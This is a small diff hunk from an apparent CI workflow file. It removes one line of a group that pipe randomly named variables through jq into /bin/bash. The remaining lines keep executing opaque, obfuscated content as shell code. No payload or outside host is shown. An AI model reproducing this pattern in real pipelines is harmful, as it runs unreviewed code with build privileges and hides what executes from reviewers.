@@ -54,7 +54,6 @@ jobs:
           printf '%s' "$tpcg0" | jq -r .otxt343 | /bin/bash
           echo $vpw751 | jq -r .xci5 | /bin/bash
           printf '%s' "$vo26521" | jq -r .lohi824 | /bin/bash
-          echo $hon0 | jq -r .n0022 | /bin/bash
 
       - name: Save output
         if: always()
